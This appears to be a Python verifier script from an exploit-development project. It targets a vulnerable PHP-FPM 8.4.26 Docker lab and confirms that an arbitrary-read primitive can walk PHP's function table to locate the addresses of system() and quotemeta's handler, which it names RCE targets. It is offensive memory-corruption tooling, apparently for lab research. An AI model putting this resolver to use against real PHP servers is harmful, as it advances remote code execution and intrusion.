#!/usr/bin/env python3
"""Verifier for functable_resolver.py on the live rvt php-fpm 8.4.26 lab.

Proves the documented result: given the arbitrary-read backend and binbase+EG_off,
the RW-only EG(function_table) name-walk resolves the RCE targets -- quotemeta's
zend_function and system's handler (&zif_system) -- with NO per-build anchor_slots
/ zif_* offset table, and both match ground truth (binbase + the offsets-table
zif_* vaddrs). RW reads only; no RO page is touched.

Lab bring-up / teardown (committed rvt profile, php-fpm 8.4.26 behind web-vuln):
    docker compose -f docker-compose.versions.yml -p vgen-rvt --profile rvt up -d --build
    python3 -I poc/primitives/read_leak/verify_functable_resolver.py --project vgen-rvt
    docker compose -f docker-compose.versions.yml -p vgen-rvt --profile rvt down
(container p2s-rvt-fpm; PID 1 is the master, so the request-heap chunk is read
from the one pool WORKER's /proc maps.)
"""
from __future__ import annotations

import argparse
import importlib.util
import os
import subprocess
import sys
import time
import urllib.request

_HERE = os.path.dirname(os.path.abspath(__file__))
_POC_ROOT = os.path.dirname(os.path.dirname(_HERE))  # poc/
_ROOT = os.path.dirname(_POC_ROOT)
for _p in (_HERE, _POC_ROOT):
    if _p not in sys.path:
        sys.path.insert(0, _p)


def _load(name, filename):
    path = os.path.join(_HERE, filename)
    spec = importlib.util.spec_from_file_location(name, path)
    mod = importlib.util.module_from_spec(spec)
    sys.modules.setdefault(name, mod)
    spec.loader.exec_module(mod)
    return mod


A = _load("var_hash_rw", "var_hash_rw.py")
R5 = _load("functable_resolver", "functable_resolver.py")  # module under test
from common.offsets import BUILTIN_OFFSETS  # noqa: E402

COMPOSE = os.path.join(_ROOT, "docker-compose.versions.yml")


def _dexec(service, *argv):
    return subprocess.run(["docker", "compose", "exec", "-T", service] + list(argv),
                          capture_output=True, text=True).stdout


def _cli_up(port):
    try:
        urllib.request.urlopen("http://127.0.0.1:%d/index.php" % port, timeout=4).read()
        return True
    except Exception:
        return False


def ensure_lab(compose, project, port):
    if _cli_up(port):
        print("[lab] rvt lab already up")
        return True
    print("[lab] bringing rvt up (-p %s --profile rvt)" % project)
    subprocess.run(["docker", "compose", "-f", compose, "-p", project,
                    "--profile", "rvt", "up", "-d", "--build"], cwd=_ROOT,
                   capture_output=True)
    for _ in range(90):
        if _cli_up(port):
            return True
        time.sleep(1)
    return False


def bootstrap_fpm(service, url):
    """binbase (php-fpm) + request-heap chunk from the one pool WORKER's maps."""
    _dexec(service, "curl", "-s", "-o", "/dev/null", url + "/index.php")
    worker = None
    for pid in _dexec(service, "sh", "-c", "ls /proc | grep -E '^[0-9]+$'").split():
        if pid == "1":
            continue
        if "pool www" in _dexec(service, "sh", "-c",
                                "cat /proc/%s/cmdline 2>/dev/null | tr '\\0' ' '" % pid):
            worker = pid
            break
    if not worker:
        return None, None
    binbase = chunk = None
    for line in _dexec(service, "cat", "/proc/%s/maps" % worker).splitlines():
        p = line.split(None, 5)
        if len(p) < 5 or "-" not in p[0]:
            continue
        s, e = (int(x, 16) for x in p[0].split("-"))
        path = p[5].strip() if len(p) > 5 else ""
        if path.endswith("/php-fpm") and binbase is None:
            binbase = s
        if (path == "" and p[1] == "rw-p" and p[2] == "00000000"
                and (e - s) >= 0x200000 and e % 0x200000 == 0 and chunk is None):
            chunk = e - 0x200000
    return binbase, chunk


def main(argv=None):
    ap = argparse.ArgumentParser(description="verify functable_resolver (fpm)")
    ap.add_argument("--compose-file", default=COMPOSE)
    ap.add_argument("--project", default="p2s-rvt")
    ap.add_argument("--service", default="rvt-fpm-vuln")
    ap.add_argument("--url", default="http://web-vuln")
    ap.add_argument("--port", type=int, default=8172)
    ap.add_argument("--down", action="store_true")
    a = ap.parse_args(argv)

    os.environ["COMPOSE_FILE"] = a.compose_file
    os.environ["COMPOSE_PROJECT_NAME"] = a.project

    print("=" * 78)
    print("VERIFY functable_resolver (table-free EG name-walk, service=%s)" % a.service)
    print("=" * 78)
    if not ensure_lab(a.compose_file, a.project, a.port):
        print("[FAIL] could not bring the rvt lab up")
        return 2

    binbase, chunk = bootstrap_fpm(a.service, a.url)
    if not binbase or not chunk:
        print("[FAIL] fpm bootstrap: binbase=%s chunk=%s" % (binbase, chunk))
        return 2
    off = BUILTIN_OFFSETS["8.4.26-fpm"]
    gt_zsys, gt_qm = binbase + off["zif_system"], binbase + off["zif_quotemeta"]
    aoff = chunk + off["a_off"]
    seed = {"chunk": chunk, "binbase": binbase, "a": aoff,
            "copy": aoff + off["copy_off"], "sid": aoff + off["sid_off"],
            "ht_post": chunk + R5.HT_POST_OFF["fpm"],
            "bg_unserialize_off": off["bg_unserialize_off"]}
    rdr = A.ArbRead(a.url, seed, service=a.service, want_sidpath=True,
                    survive=True, verbose=False)
    print("[*] binbase=%#x chunk=%#x" % (binbase, chunk))

    w = R5.FunctionTableWalker(rdr, binbase, R5.EG_OFF["fpm"], verbose=True)
    res = w.resolve(("system", "quotemeta"))
    zsys = res["system"]["handler"]
    fn = res["quotemeta"]["fn"]
    qm = res["quotemeta"]["handler"]
    print("  zif_system = %s  GT=%#x  %s"
          % (hex(zsys) if zsys else None, gt_zsys, "OK" if zsys == gt_zsys else "MISMATCH"))
    print("  quotemeta handler = %s  GT=%#x  %s"
          % (hex(qm) if qm else None, gt_qm, "OK" if qm == gt_qm else "MISMATCH"))
    print("  quotemeta fn = %s  (reads=%d)" % (hex(fn) if fn else None, rdr.req_count))

    print("-" * 78)
    ok = bool(fn) and zsys == gt_zsys and qm == gt_qm
    print("  [%s] table-free resolve == ground truth (no anchor_slots/zif table)"
          % ("PASS" if ok else "FAIL"))
    print("  VERDICT: %s" % ("PASS" if ok else "FAIL"))

    if a.down:
        subprocess.run(["docker", "compose", "-f", a.compose_file, "-p", a.project,
                        "--profile", "rvt", "down"], cwd=_ROOT, capture_output=True)
    return 0 if ok else 1


if __name__ == "__main__":
    raise SystemExit(main())
